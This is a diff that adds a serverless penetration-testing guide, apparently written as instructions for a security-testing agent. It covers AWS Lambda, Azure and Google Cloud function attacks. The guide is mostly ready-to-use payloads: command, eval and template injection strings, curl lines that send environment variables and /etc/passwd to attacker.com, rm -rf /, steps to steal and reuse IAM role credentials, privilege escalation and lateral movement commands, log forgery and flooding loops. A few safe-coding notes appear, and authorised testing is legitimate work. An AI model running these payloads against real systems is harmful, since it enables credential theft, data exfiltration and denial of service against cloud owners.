@@ -1,0 +1,838 @@
+<serverless_attacks_guide>
+<title>SERVERLESS SECURITY TESTING</title>
+
+<critical>Serverless functions (AWS Lambda, Azure Functions, Google Cloud Functions) have unique attack surfaces including cold start exploitation, event injection, environment variable leakage, function URL bypass, and execution role abuse. Focus on ephemeral nature, event-driven triggers, and IAM/role permissions.</critical>
+
+<scope>
+- Lambda/Cloud Function exploitation and code injection
+- Cold start timing attacks and resource exhaustion
+- Event injection attacks (SQS, SNS, S3, API Gateway, etc.)
+- Environment variable leakage and secrets exposure
+- Function URL and API Gateway bypass
+- Execution role abuse and privilege escalation
+- Layer poisoning and dependency confusion
+- Function timeout and memory exhaustion
+- Logging and monitoring evasion
+</scope>
+
+<methodology>
+1. Identify serverless functions (Lambda, Azure Functions, Cloud Functions)
+2. Map event sources and triggers (API, queues, storage, etc.)
+3. Test event injection and payload manipulation
+4. Enumerate environment variables and IAM roles
+5. Probe for code injection and command execution
+6. Test cold start and resource limit exploitation
+7. Analyze function URL/API Gateway security
+8. Attempt privilege escalation via execution role
+</methodology>
+
+<function_enumeration>
+<aws_lambda>
+{% raw %}
+# Identify Lambda functions
+
+# Via API Gateway endpoint patterns:
+# https://<api-id>.execute-api.<region>.amazonaws.com/<stage>/<path>
+# https://abcd1234.execute-api.us-east-1.amazonaws.com/prod/users
+
+# Via Function URLs (Lambda URLs):
+# https://<url-id>.lambda-url.<region>.on.aws/
+# https://abc123def456.lambda-url.us-east-1.on.aws/
+
+# Check response headers:
+# x-amzn-requestid: <request-id>
+# x-amzn-trace-id: Root=...
+# x-amz-executed-version: $LATEST or version number
+
+# Error messages reveal Lambda:
+{
+  "message": "Internal server error"
+}
+# Or stack traces in debug mode
+
+# CloudWatch Logs pattern:
+# Lambda function names often in logs
+# /aws/lambda/<function-name>
+
+# List functions (if AWS credentials available):
+aws lambda list-functions
+aws lambda get-function --function-name <name>
+{% endraw %}
+</aws_lambda>
+
+<azure_functions>
+{% raw %}
+# Identify Azure Functions
+
+# URL patterns:
+# https://<function-app>.azurewebsites.net/api/<function-name>
+# https://myapp.azurewebsites.net/api/HttpTrigger1
+
+# Response headers:
+# server: Microsoft-IIS/10.0
+# x-azure-ref: <reference>
+
+# Function keys in URL (sometimes):
+# ?code=<function-key>
+# ?clientId=<app-id>
+
+# Error messages:
+{
+  "error": {
+    "message": "Function not found",
+    "type": "FunctionNotFoundError"
+  }
+}
+
+# List functions (if Azure credentials):
+az functionapp list
+az functionapp function list --name <app-name> --resource-group <rg>
+{% endraw %}
+</azure_functions>
+
+<gcp_cloud_functions>
+{% raw %}
+# Identify Google Cloud Functions
+
+# URL patterns:
+# https://<region>-<project-id>.cloudfunctions.net/<function-name>
+# https://us-central1-myproject.cloudfunctions.net/myFunction
+
+# Response headers:
+# server: Google Frontend
+# function-execution-id: <id>
+
+# Error messages:
+{
+  "error": {
+    "code": 404,
+    "message": "Function not found",
+    "status": "NOT_FOUND"
+  }
+}
+
+# List functions (if GCP credentials):
+gcloud functions list
+gcloud functions describe <function-name>
+{% endraw %}
+</gcp_cloud_functions>
+</function_enumeration>
+
+<event_injection>
+<api_gateway_injection>
+{% raw %}
+# API Gateway -> Lambda event injection
+
+# Lambda receives event object:
+{
+  "body": "...",
+  "headers": {...},
+  "queryStringParameters": {...},
+  "pathParameters": {...},
+  "requestContext": {...}
+}
+
+# Attack vectors:
+
+# 1. Body injection:
+POST /api/function
+{"input": "'; rm -rf / #"}
+
+# If Lambda executes input:
+# In Python: eval(event['body']['input'])
+# In Node.js: exec(event.body.input)
+
+# 2. Header injection:
+X-Custom-Header: $(curl http://attacker.com/$(whoami))
+X-Forwarded-For: 127.0.0.1; $(id)
+
+# 3. Query parameter injection:
+GET /api/function?param=value'; DROP TABLE users;--
+
+# 4. Path parameter injection:
+GET /api/function/../../etc/passwd
+
+# 5. JSON payload manipulation:
+{
+  "user": {
+    "role": "admin",
+    "__proto__": {"isAdmin": true}
+  }
+}
+{% endraw %}
+</api_gateway_injection>
+
+<s3_event_injection>
+{% raw %}
+# S3 -> Lambda event injection
+
+# Lambda triggered by S3 events:
+# - s3:ObjectCreated:*
+# - s3:ObjectRemoved:*
+
+# Event structure:
+{
+  "Records": [{
+    "s3": {
+      "bucket": {"name": "my-bucket"},
+      "object": {
+        "key": "file.txt",
+        "size": 1024
+      }
+    }
+  }]
+}
+
+# Attack: Upload malicious file
+
+# 1. Filename injection:
+# Upload file: file.txt'; curl http://attacker.com #.jpg
+# If Lambda processes filename without sanitization
+
+# 2. Content injection:
+# Upload file with malicious content
+# If Lambda processes content (image, PDF, etc.)
+
+# 3. Metadata injection:
+aws s3 cp file.txt s3://bucket/ --metadata "cmd=id"
+# Lambda reads metadata, executes command
+
+# 4. Large file DoS:
+# Upload extremely large file
+# Lambda times out or exhausts memory processing it
+
+# 5. Archive bomb (zip, tar):
+# Upload compressed file that expands to huge size
+# Lambda exhausts disk/memory extracting it
+{% endraw %}
+</s3_event_injection>
+
+<sqs_sns_injection>
+{% raw %}
+# SQS/SNS -> Lambda event injection
+
+# SQS event:
+{
+  "Records": [{
+    "body": "<message-content>",
+    "messageAttributes": {...}
+  }]
+}
+
+# SNS event:
+{
+  "Records": [{
+    "Sns": {
+      "Message": "<message-content>",
+      "MessageAttributes": {...}
+    }
+  }]
+}
+
+# Attack: Send malicious message
+
+# 1. Command injection in message:
+aws sqs send-message \
+  --queue-url <url> \
+  --message-body '{"cmd": "$(whoami)"}'
+
+# If Lambda executes:
+# exec(message['cmd'])
+
+# 2. JSON injection:
+{
+  "user_id": 123,
+  "command": "delete_account",
+  "admin": true
+}
+
+# 3. Large message:
+# Send max size message (256 KB for SQS)
+# Multiple times to exhaust Lambda
+
+# 4. Message flooding:
+# Send thousands of messages
+# Trigger Lambda repeatedly
+# Exhaust concurrency limits or budget
+{% endraw %}
+</sqs_sns_injection>
+
+<dynamodb_stream_injection>
+{% raw %}
+# DynamoDB Streams -> Lambda
+
+# Event structure:
+{
+  "Records": [{
+    "dynamodb": {
+      "NewImage": {
+        "field": {"S": "value"}
+      },
+      "OldImage": {...}
+    }
+  }]
+}
+
+# Attack: Insert malicious data in DynamoDB
+
+# 1. Inject command in field:
+aws dynamodb put-item \
+  --table-name Users \
+  --item '{"username": {"S": "test$(id)"}}'
+
+# If Lambda processes username field
+
+# 2. Prototype pollution:
+{
+  "user": {
+    "__proto__": {"isAdmin": true}
+  }
+}
+
+# 3. NoSQL injection:
+{
+  "query": {"$ne": null}
+}
+{% endraw %}
+</dynamodb_stream_injection>
+
+<custom_event_injection>
+{% raw %}
+# Custom event sources
+
+# EventBridge (CloudWatch Events):
+aws events put-events \
+  --entries '[{
+    "Source": "custom.app",
+    "DetailType": "userAction",
+    "Detail": "{\"cmd\": \"id\"}"
+  }]'
+
+# If Lambda processes Detail JSON
+
+# Kinesis Streams:
+# Similar to SQS, inject via stream records
+
+# IoT Core:
+# MQTT message injection
+
+# Step Functions:
+# State machine input manipulation
+{% endraw %}
+</custom_event_injection>
+</event_injection>
+
+<code_injection>
+<command_injection>
+{% raw %}
+# Command injection in serverless functions
+
+# Python Lambda example:
+import os
+def lambda_handler(event, context):
+    filename = event['filename']
+    os.system(f"cat {filename}")  # Vulnerable!
+
+# Attack:
+{"filename": "file.txt; whoami"}
+{"filename": "file.txt && curl http://attacker.com/$(cat /etc/passwd | base64)"}
+
+# Node.js example:
+const { exec } = require('child_process');
+exports.handler = async (event) => {
+    const cmd = event.command;
+    exec(cmd, (error, stdout, stderr) => {  // Vulnerable!
+        // ...
+    });
+};
+
+# Attack:
+{"command": "id"}
+{"command": "curl http://attacker.com?data=$(env | base64)"}
+
+# Python subprocess injection:
+import subprocess
+subprocess.run(["echo", user_input], shell=True)  # Vulnerable if shell=True
+
+# Safe alternatives:
+subprocess.run(["echo", user_input], shell=False)
+subprocess.run(["echo", user_input])
+{% endraw %}
+</command_injection>
+
+<code_eval_injection>
+{% raw %}
+# eval() and similar dangerous functions
+
+# Python:
+result = eval(event['expression'])  # Never do this!
+
+# Attack:
+{"expression": "__import__('os').system('id')"}
+{"expression": "open('/etc/passwd').read()"}
+
+# Node.js:
+const result = eval(event.code);  // Never do this!
+
+# Attack:
+{"code": "require('child_process').execSync('id').toString()"}
+
+# Python exec():
+exec(event['code'])  # Dangerous!
+
+# Attack:
+{"code": "import os; os.system('whoami')"}
+{% endraw %}
+</code_eval_injection>
+
+<template_injection>
+{% raw %}
+# Template injection in serverless
+
+# Python Jinja2:
+from jinja2 import Template
+template = Template(event['template'])
+output = template.render()  # Vulnerable!
+
+# Attack:
+{"template": "{{config.items()}}"}
+{"template": "{{''.__class__.__mro__[1].__subclasses__()}}"}
+
+# SSTI RCE:
+{"template": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"}
+
+# Node.js template engines (Pug, EJS, Handlebars):
+# Similar injection patterns
+{% endraw %}
+</template_injection>
+
+<sql_injection>
+{% raw %}
+# SQL injection in serverless functions
+
+# Python with string concatenation:
+import pymysql
+def lambda_handler(event, context):
+    user_id = event['user_id']
+    query = f"SELECT * FROM users WHERE id = '{user_id}'"  # Vulnerable!
+    cursor.execute(query)
+
+# Attack:
+{"user_id": "1' OR '1'='1"}
+{"user_id": "1'; DROP TABLE users;--"}
+
+# Safe: Parameterized queries
+query = "SELECT * FROM users WHERE id = %s"
+cursor.execute(query, (user_id,))
+{% endraw %}
+</sql_injection>
+</code_injection>
+
+<environment_secrets>
+<env_var_leakage>
+{% raw %}
+# Environment variables in Lambda
+
+# Lambda environment variables accessible via:
+import os
+secret = os.environ.get('DB_PASSWORD')
+
+# Attack vectors:
+
+# 1. Error message leakage:
+# Trigger error that dumps env vars
+# Stack traces may include environment
+
+# 2. Logging leakage:
+# If function logs env vars (debug mode)
+# CloudWatch Logs exposes them
+
+# 3. SSRF to metadata:
+# From within Lambda, access metadata service (in VPC)
+import requests
+metadata = requests.get('http://169.254.169.254/latest/meta-data/')
+
+# 4. Code injection to dump env:
+{"cmd": "env"}
+{"cmd": "printenv"}
+{"code": "import os; print(os.environ)"}
+
+# 5. Dependency vulnerability:
+# Vulnerable package that logs environment
+
+# Common secrets in env vars:
+# - DB_HOST, DB_PASSWORD
+# - API_KEY, SECRET_KEY
+# - AWS_ACCESS_KEY_ID (from role, but still present)
+# - STRIPE_API_KEY, SENDGRID_API_KEY
+# - JWT_SECRET
+{% endraw %}
+</env_var_leakage>
+
+<iam_role_extraction>
+{% raw %}
+# Lambda execution role credentials
+
+# Lambda functions assume IAM role
+# Temporary credentials available via environment:
+# - AWS_ACCESS_KEY_ID
+# - AWS_SECRET_ACCESS_KEY
+# - AWS_SESSION_TOKEN
+
+# Or via metadata (if in VPC):
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+
+# Attack: Extract and use credentials
+
+# 1. Via code injection:
+{"cmd": "env | grep AWS"}
+{"code": "import os; print(os.environ['AWS_SECRET_ACCESS_KEY'])"}
+
+# 2. Exfiltrate via DNS:
+{"cmd": "curl http://$(env | base64 -w0).attacker.com"}
+
+# 3. Exfiltrate via HTTP:
+{"cmd": "curl -X POST http://attacker.com -d \"$(env)\""}
+
+# Use extracted credentials:
+export AWS_ACCESS_KEY_ID=...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws s3 ls  # Test permissions
+
+# Check role permissions:
+aws sts get-caller-identity
+aws iam get-role --role-name <role-name>
+aws iam list-attached-role-policies --role-name <role-name>
+{% endraw %}
+</iam_role_extraction>
+
+<secrets_manager_access>
+{% raw %}
+# AWS Secrets Manager / Parameter Store
+
+# Lambda often has permission to read secrets
+# Check if accessible
+
+# Secrets Manager:
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id <secret-name>
+
+# Parameter Store:
+aws ssm get-parameters --names <param-name>
+aws ssm get-parameters-by-path --path /myapp/
+
+# Via code injection:
+{"code": "import boto3; sm = boto3.client('secretsmanager'); print(sm.get_secret_value(SecretId='prod/db/password'))"}
+
+# Enumerate secrets:
+aws secretsmanager list-secrets | jq -r '.SecretList[].Name'
+# Try to retrieve each
+{% endraw %}
+</secrets_manager_access>
+</environment_secrets>
+
+<cold_start_attacks>
+<timing_exploitation>
+{% raw %}
+# Cold start vs warm start
+
+# Cold start: First invocation, slow (seconds)
+# Warm start: Reuse container, fast (milliseconds)
+
+# Timing attack:
+
+# 1. Measure response time
+import time
+start = time.time()
+response = requests.post(lambda_url, json=payload)
+duration = time.time() - start
+print(f"Duration: {duration}s")
+
+# Cold start indicators:
+# - Longer response time (2-10 seconds)
+# - x-amzn-trace-id header different
+# - x-amz-executed-version may differ
+
+# 2. Force cold start:
+# Wait for timeout (Lambda container recycles after ~15 min inactivity)
+# Send request after 15+ min
+# Observe longer response time
+
+# 3. Exploit cold start logic:
+# Some apps initialize differently on cold start
+# Global variables, database connections, etc.
+# May bypass security checks during initialization
+{% endraw %}
+</timing_exploitation>
+
+<resource_exhaustion>
+{% raw %}
+# Exhaust Lambda resources
+
+# 1. Memory exhaustion:
+# Send large payload
+POST /api/function
+{"data": "A" * 10000000}  # 10 MB
+
+# If Lambda processes into memory, may exceed limit
+# Default: 128 MB, Max: 10 GB
+
+# 2. Timeout exploitation:
+# Send payload that causes long processing
+# Lambda times out (default: 3s, max: 15min)
+{"sleep": 900}  # Sleep for 15 minutes
+
+# If timeout, operation incomplete
+# May leave inconsistent state
+
+# 3. Concurrent execution exhaustion:
+# Send many requests simultaneously
+# Exhaust concurrent execution limit (default: 1000)
+for i in range(10000):
+    requests.post(lambda_url, json=payload)
+
+# Result: Throttling errors
+# {"errorMessage": "Rate exceeded"}
+
+# 4. Storage exhaustion:
+# Lambda has /tmp with 512 MB (or 10 GB)
+# Upload/create large files
+{"action": "create_file", "size": 512000000}
+{% endraw %}
+</resource_exhaustion>
+</cold_start_attacks>
+
+<privilege_escalation>
+<role_assumption>
+{% raw %}
+# Privilege escalation via IAM role
+
+# If Lambda has sts:AssumeRole permission:
+import boto3
+sts = boto3.client('sts')
+credentials = sts.assume_role(
+    RoleArn='arn:aws:iam::123456789012:role/AdminRole',
+    RoleSessionName='escalation'
+)
+
+# Use escalated credentials
+
+# Check current role:
+aws sts get-caller-identity
+
+# List roles (if iam:ListRoles permission):
+aws iam list-roles
+
+# Try to assume each role:
+for role in roles:
+    try:
+        aws sts assume-role --role-arn role['Arn'] --role-session-name test
+    except:
+        pass
+{% endraw %}
+</role_assumption>
+
+<permission_discovery>
+{% raw %}
+# Enumerate Lambda permissions
+
+# Via code injection or from extracted credentials:
+
+# List functions:
+aws lambda list-functions
+
+# Get function configuration:
+aws lambda get-function --function-name <name>
+
+# Check execution role:
+aws iam get-role --role-name <role-name>
+aws iam list-attached-role-policies --role-name <role-name>
+aws iam get-policy --policy-arn <arn>
+aws iam get-policy-version --policy-arn <arn> --version-id <version>
+
+# Test permissions:
+# S3:
+aws s3 ls
+aws s3 cp s3://bucket/file.txt -
+
+# DynamoDB:
+aws dynamodb list-tables
+aws dynamodb scan --table-name <table>
+
+# Secrets Manager:
+aws secretsmanager list-secrets
+
+# Lambda:
+aws lambda invoke --function-name <name> output.txt
+
+# IAM:
+aws iam list-users
+aws iam create-access-key --user-name <user>
+{% endraw %}
+</permission_discovery>
+
+<lateral_movement>
+{% raw %}
+# Move to other AWS services
+
+# From Lambda with broad permissions:
+
+# 1. Invoke other Lambda functions:
+aws lambda invoke \
+  --function-name other-function \
+  --payload '{"data": "malicious"}' \
+  output.json
+
+# 2. Access S3 buckets:
+aws s3 ls s3://sensitive-bucket
+aws s3 cp s3://sensitive-bucket/secrets.txt -
+
+# 3. Query DynamoDB:
+aws dynamodb scan --table-name Users
+
+# 4. Publish to SNS:
+aws sns publish \
+  --topic-arn <arn> \
+  --message "malicious message"
+
+# 5. Send SQS messages:
+aws sqs send-message \
+  --queue-url <url> \
+  --message-body "malicious"
+
+# 6. Modify CloudWatch Logs:
+aws logs create-log-stream --log-group-name <name> --log-stream-name attack
+aws logs put-log-events --log-group-name <name> --log-stream-name attack --log-events timestamp=<ts>,message="fake log"
+
+# 7. EC2 access (if VPC Lambda):
+# Pivot to EC2 instances in same VPC
+# Or access RDS databases
+{% endraw %}
+</lateral_movement>
+</privilege_escalation>
+
+<function_url_bypass>
+<authentication_bypass>
+{% raw %}
+# Lambda Function URLs
+
+# Types:
+# - AUTH_TYPE: AWS_IAM (requires sig v4)
+# - AUTH_TYPE: NONE (public)
+
+# Test authentication:
+curl https://<function-url-id>.lambda-url.us-east-1.on.aws/
+
+# If NONE: Works without auth
+# If AWS_IAM: Requires signed request
+
+# Bypass attempts:
+
+# 1. CORS bypass:
+Origin: https://trusted-domain.com
+# Check if CORS allows
+
+# 2. Method bypass:
+# GET /endpoint (protected)
+# POST /endpoint (unprotected?)
+
+# 3. Path manipulation:
+/api/function
+/api/function/
+/./api/function
+
+# 4. Header injection:
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+# If Lambda trusts these headers
+
+# 5. Query parameter auth:
+?auth=<leaked-token>
+?api_key=<key>
+{% endraw %}
+</authentication_bypass>
+</function_url_bypass>
+
+<layer_poisoning>
+<dependency_confusion>
+{% raw %}
+# Lambda Layers supply dependencies
+
+# Attack: Poison layer with malicious code
+
+# If attacker can modify layer:
+# 1. Create malicious package
+# 2. Upload to layer
+# 3. Lambda uses poisoned dependency
+
+# Example: Override common package
+# Create malicious 'requests' package
+# Lambda imports it, executes malicious code
+
+# Supply chain attack:
+# If Lambda uses public packages
+# Publish malicious version to public registry
+# Lambda installs it on next deploy
+
+# Typosquatting:
+# Lambda requires 'requests'
+# Attacker publishes 'reqeusts' (typo)
+# Mis-configuration installs malicious package
+{% endraw %}
+</dependency_confusion>
+</layer_poisoning>
+
+<validation>
+1. Demonstrate event injection leading to code execution
+2. Extract environment variables (secrets, credentials)
+3. Show IAM role credential extraction and abuse
+4. Prove privilege escalation via assumed roles
+5. Execute arbitrary code via injection vector
+6. Demonstrate resource exhaustion (DoS)
+7. Show lateral movement to other AWS services
+8. Provide reproducible payloads and commands
+</validation>
+
+<false_positives>
+- Proper input validation and sanitization
+- Parameterized queries (no SQL injection)
+- Secrets in Secrets Manager, not env vars
+- Least privilege IAM roles
+- Resource limits enforced (timeout, memory, concurrency)
+- Authentication on Function URLs
+- VPC isolation for sensitive functions
+- Layer signing and verification
+</false_positives>
+
+<impact>
+- Remote code execution in Lambda
+- Credential theft (IAM role, secrets)
+- Privilege escalation (assume admin roles)
+- Data exfiltration (S3, DynamoDB, etc.)
+- Lateral movement to other services
+- Denial of service (resource exhaustion)
+- Supply chain compromise (layer poisoning)
+- Cost inflation (function abuse)
+</impact>
+
+<pro_tips>
+1. Always try to extract environment variables first
+2. IAM role credentials in Lambda are temporary but powerful
+3. Test all event sources (API, S3, SQS, DynamoDB, etc.)
+4. Cold start timing differences reveal Lambda behavior
+5. Function URLs with AUTH_TYPE=NONE are completely public
+6. Lambda has internet access by default—use for exfiltration
+7. /tmp directory is shared across invocations (warm containers)
+8. Check for overly permissive IAM roles (AdministratorAccess)
+9. CloudWatch Logs retain function output—may leak secrets
+10. Lambda layers are shared—poisoning affects all functions
+11. Concurrent execution limits can be exhausted for DoS
+12. Error messages often leak sensitive information
+13. VPC Lambda can access RDS, ElastiCache, internal services
+14. Test with large payloads to trigger memory/timeout
+15. Multiple programming languages have different vuln patterns
+</pro_tips>
+
+<remember>Serverless functions are ephemeral but not isolated. Event-driven architecture creates injection opportunities at every trigger point. Environment variables are the weakest link for secrets. IAM roles in Lambda provide powerful AWS API access. Cold start behavior can reveal timing-based vulnerabilities. Function URLs without authentication are public endpoints. Proper input validation is critical—all event data is untrusted. Resource limits (memory, timeout, concurrency) enable DoS attacks. Logging often exposes secrets unintentionally. Serverless doesn't mean secure—it just shifts the attack surface.</remember>
+</serverless_attacks_guide>
